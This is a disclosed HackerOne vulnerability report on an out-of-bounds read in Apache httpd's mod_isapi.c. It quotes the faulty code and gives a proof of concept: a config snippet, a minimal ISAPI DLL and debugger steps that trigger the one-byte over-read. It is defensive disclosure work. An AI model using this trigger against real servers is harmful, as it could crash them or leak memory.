# Read beyond bounds in mod_isapi.c [zhbug_httpd_41]

## Report Details
- **Report ID**: 1595296
- **URL**: https://hackerone.com/reports/1595296
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-06-08T23:19:58.263Z
- **Disclosed**: 2022-07-09T13:50:51.025Z

## Reporter
- **Username**: tdp3kel9g
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Greetings. I have found a read-beyond-bounds bug in httpd that arises from an apparent logic error.

The bug is in /modules/arch/win32/mod_isapi.c, on lines 979 and/or 983, which use the length of the path to the ISAPI DLL (|strlen(r->filename)|) to index into the string specified by the ISAPI DLL itself in its call to ServerSupportFunction/HSE_REQ_MAP_URL_TO_PATH, which contains unrelated data. This error presumably can be exploited under appropriate conditions.

This bug is still present in trunk.

Relevant code:
```
966:     case HSE_REQ_MAP_URL_TO_PATH:
967:     {
968:         /* Map a URL to a filename */
969:         char *file = (char *)buf_data;
970:         apr_uint32_t len;
971:         subreq = ap_sub_req_lookup_uri(
972:                      apr_pstrndup(cid->r->pool, file, *buf_size), r, NULL);
973:
974:         if (!subreq->filename) {
975:             ap_destroy_sub_req(subreq);
976:             return 0;
977:         }
978:
979:         len = (apr_uint32_t)strlen(r->filename);
980:
981:         if ((subreq->finfo.filetype == APR_DIR)
982:               && (!subreq->path_info)
983:               && (file[len - 1] != '/'))
984:             file = apr_pstrcat(cid->r->pool, subreq->filename, "/", NULL);
985:         else
986:             file = apr_pstrcat(cid->r->pool, subreq->filename,
987: subreq->path_info, NULL);
988:
989:         ap_destroy_sub_req(subreq);
990:
991: #ifdef WIN32
992:         /* We need to make this a real Windows path name */
993:         apr_filepath_merge(&file, "", file, APR_FILEPATH_NATIVE, r->pool);
994: #endif
995:
996:         *buf_size = apr_cpystrn(buf_data, file, *buf_size) - buf_data;
997:
998:         return 1;
999:    }
```
Attached is a POC that demonstrates the bug. To use it:

   1. Add the specified lines to httpd.conf.
   2. Build dllmain.cpp and foo.def into foo.dll.
   3. Create the folder /bug41 in the webserver root.
   4. Copy foo.dll into /bug41 .
   5. Run httpd and attach a debugger to it.
   6. Set a BP on line 969, above.
   7. Open a browser (or CURL) and attempt to load the URL <server>/bug41/foo.dll .
   8. When the BP fires, step through line 979.
   9. Notice that |r->filename| is something like "g:/serverroot/bug41/foo.dll" (the filesystem path to the ISAPI DLL)  and that |len| is its length.
   10. Notice that |file| points to a 0 byte string (string length 0), which is what HttpExtensionProc() in foo.dll sent in its call to ServerSupportFunction/HSE_REQ_MAP_URL_TO_PATH (dllmain.cpp line 30).
   11. Step once more and notice that line 983 reads one byte from |len-1| bytes beyond the end of |file|.
```
-------- httpd.conf lines ----------------------------------------------------
<Location /bug41>
    AddHandler isapi-handler .dll
    Options ExecCGI
    Allow from all
</Location>
-------- httpd.conf lines ----------------------------------------------------
```
```
-------- dllmain.cpp ----------------------------------------------------
#include <windows.h>
#include <HttpExt.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL WINAPI GetExtensionVersion(HSE_VERSION_INFO * pVI) {
    return TRUE;
}

DWORD WINAPI HttpExtensionProc(EXTENSION_CONTROL_BLOCK* pECB) {

    char buf[] = "";
    DWORD bufSize = sizeof(buf);

    pECB->ServerSupportFunction(
        pECB->ConnID, HSE_REQ_MAP_URL_TO_PATH, buf, &bufSize, NULL);

    return HSE_STATUS_SUCCESS;
}
-------- dllmain.cpp ----------------------------------------------------

-------- foo.def ----------------------------------------------------
LIBRARY foo
EXPORTS
    DllMain
    GetExtensionVersion
    HttpExtensionProc
-------- foo.def ----------------------------------------------------
```

## Impact

Beyond bounds data might be returned to an ISAPI extension DLL. This could potentially be returned to an attacker, but, in mitigation, the path is indirect. The bug could also cause a crash. The bug can be reached only if the victim site uses an ISAPI extension DLL.

## Attachments
No attachments
